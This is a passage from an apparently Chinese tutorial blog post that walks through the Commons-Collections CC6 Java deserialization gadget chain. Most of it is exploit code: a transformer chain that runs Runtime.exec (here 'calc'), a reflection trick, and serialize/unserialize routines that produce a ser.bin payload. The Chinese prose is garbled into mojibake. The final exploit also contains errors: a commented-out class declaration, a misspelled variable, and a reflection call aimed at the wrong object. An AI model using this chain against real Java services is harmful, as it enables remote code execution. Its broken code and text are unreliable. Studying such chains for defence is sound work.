class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;) <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> tiedMapEntry.getValue();<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œè¯´ç™½äº†è¿˜æ˜¯å»è°ƒ<code>LazyMap.get(&quot;å‰å‰å‰&quot;)</code>ï¼Œåˆ©ç”¨ä¸‹é¢è¿™ä¸œè¥¿ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> tiedMapEntry.getValue();<br><span class="hljs-comment">//getValueæ–¹æ³•ï¼š</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br><span class="hljs-comment">//è¿™é‡Œmapæ˜¯æ„é€ å‡½æ•°é‡Œçš„Lazymapï¼Œè€Œä¸”è¿™ä¸œè¥¿æ˜¯ä¸ªpublicä¿®é¥°çš„ï¼Œç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡è°ƒç”¨å°±è¡Œ</span><br></code></pre></td></tr></table></figure>

<p>å†å¾€ä¸Šæ‰¾è°è°ƒç”¨äº†è¿™ä¸ª<code>getValue()</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TiedMapEntry.java</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>        <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>               (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>    &#125;<br></code></pre></td></tr></table></figure>

<p>è°è°ƒç”¨äº†<code>hashcode()</code>è¿™ä¸ªæ–¹æ³•ï¼Ÿ</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">xxx.readObject<span class="hljs-comment">()</span><br>	HashMap.put<span class="hljs-comment">()</span> --è‡ªåŠ¨è°ƒç”¨--&gt;   HashMap.hash<span class="hljs-comment">()</span><br>		åç»­åˆ©ç”¨é“¾.hashCode<span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure>

<p>ä» <code>HashMap.put</code> å¼€å§‹ï¼Œåˆ° <code>InvokerTransformer</code> ç»“å°¾çš„å¼¹è®¡ç®—å™¨çš„ EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// ç”¨ HashMap çš„ hash æ–¹æ³•å®Œæˆé“¾å­  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMapEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>HashMap</code> ç±»çš„ <code>put()</code> æ–¹æ³•è‡ªåŠ¨è°ƒç”¨äº† <code>hash</code> æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨<code>hashicode</code>æ–¹æ³•:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br><span class="hljs-comment">//TiedMapEntryä¸‹çš„hashcodeæ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>        (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸ªå°é—®é¢˜ï¼šåœ¨EXPè¿™é‡Œæ‰“æ–­ç‚¹ï¼š</p>
<p><img src="/img/CC601.png" srcset="/img/loading.gif" lazyload alt="CC601"></p>
<p><code>Debug</code>çš„æ—¶å€™å°±èƒ½ç›´æ¥å¼¹è®¡ç®—å™¨äº†</p>
<p>è¿™é‡Œç”šè‡³éƒ½æ²¡æœ‰è¿›è¡Œputæ“ä½œï¼Œå› ä¸ºï¼š</p>
<p>å› ä¸ºåœ¨ IDEA è¿›è¡Œ debug è°ƒè¯•çš„æ—¶å€™ï¼Œä¸ºäº†å±•ç¤ºå¯¹è±¡çš„é›†åˆï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ <code>toString()</code> æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨åˆ›å»º <code>TiedMapEntry</code> çš„æ—¶å€™ï¼Œå°±è‡ªåŠ¨è°ƒç”¨äº† <code>getValue()</code> æœ€ç»ˆå°†é“¾å­èµ°å®Œï¼Œç„¶åå¼¹å‡ºè®¡ç®—å™¨ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/">å‚è€ƒæ–‡ç« </a></p>
<p>ç›®å‰å†™å‡ºçš„CC6é“¾å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// ç”¨ HashMap çš„ hash æ–¹æ³•å®Œæˆé“¾å­  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC603</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br>        HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        serialize(expMap);<br>        <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™æ—¶è¿è¡Œåºåˆ—åŒ–å°±ä¼šç›´æ¥å¼¹å‡ºè®¡ç®—å™¨ï¼š</p>
<p>å…¶å®å°±æ˜¯hashmapé‡Œé‚£ä¸ªputæ–¹æ³•çš„é”…ï¼šå¯ä»¥çœ‹åˆ°åœ¨putçš„æ—¶å€™å°±å·²ç»è§¦å‘hashæ–¹æ³•äº†ï¼Œè€Œä¸æ˜¯ç­‰åˆ°readobjectçš„æ—¶å€™è§¦å‘hashæ–¹æ³•</p>
<p>å…¶å®è¿™é‡Œå’ŒURLDNSé‚£æ¡é“¾å­ä¸€æ ·ï¼šæˆ‘ä»¬å¸Œæœ›æ˜¯ç”±<code>readObject</code>æ–¹æ³•è§¦å‘<code>hash</code>ç„¶åè§¦å‘<code>hashcode</code>ï¼Œä½†å‰é¢ä¹Ÿè¯´äº†ï¼š<code>put</code>çš„æ—¶å€™ä¹Ÿä¼šèµ°åˆ°<code>hash</code>é‚£è¾¹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Hashmap</span><br>    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ä¿®æ”¹çš„ç›®çš„ï¼Ÿè®©putæ–¹æ³•çš„æ—¶å€™æ— æ³•è§¦å‘è¿™æ¡é“¾å­ï¼Œæ¯”å¦‚æˆ‘åœ¨putå‰å…ˆæŠŠè¿™æ¡é“¾å­é‡ŒæŸäº›ä¸œè¥¿æ”¹æˆé”™è¯¯çš„ï¼Œputå®Œä¹‹åä¿®æ”¹æˆæ­£ç¡®çš„ï¼Œè®©å®ƒç­‰åˆ°ååºåˆ—åŒ–çš„readobjectæ—¶å†è§¦å‘ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br><br><br>-----------------&gt; å˜æˆ<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;five&quot;</span>));<br><br><br><span class="hljs-comment">//åœ¨æ‰§è¡Œ put æ–¹æ³•ä¹‹åé€šè¿‡åå°„ä¿®æ”¹ Transformer çš„ factory å€¼</span><br><br><br>Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br><span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);  <br>factoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>factoryField.set(lazyMapClass, chainedTransformer);<br></code></pre></td></tr></table></figure>

<p>ä½†è¿™æ—¶å‘ç°ååºåˆ—åŒ–è¿˜æ˜¯æ²¡æ³•è§¦å‘è®¡ç®—å™¨ï¼Œé—®é¢˜å‡ºåœ¨Lazymapçš„getæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„ä»–è¿™ä¸ªä¸œè¥¿ä¼šåœ¨mapä¸­ä¸åŒ…å«keyçš„æ—¶å€™æ‰ä¼šè§¦å‘åé¢é‚£ä¸ªfactory.transform(key)ï¼Œç„¶åä»–ä¼šæŠŠè¿™ä¸ªkeyæ”¾è¿›å»ï¼ï¼é‚£ä¹ˆæˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿™é‡Œå°±å·²ç»æœ‰è¿™ä¸ªkeyäº†ï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘factory.transform(key)è¿™ä¸ªæ–¹æ³•ã€‚</p>
<p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œputå®Œå†æŠŠkeyåˆ äº†å°±è¡Œï¼š</p>
<p>Finalexp:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// CC6 é“¾æœ€ç»ˆ EXPpublic class FinalCC6EXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;five&quot;</span>)); <span class="hljs-comment">// é˜²æ­¢åœ¨ååºåˆ—åŒ–å‰å¼¹è®¡ç®—å™¨  </span><br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);  <br> lazymap.remove(<span class="hljs-string">&quot;key&quot;</span>);<br>  <br> <span class="hljs-comment">// åœ¨ put ä¹‹åé€šè¿‡åå°„ä¿®æ”¹å€¼  </span><br> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);  <br> factoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> factoryField.set(lazyMapClass, chainedTransformer);  <br>  <br> serialize(expMap);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span 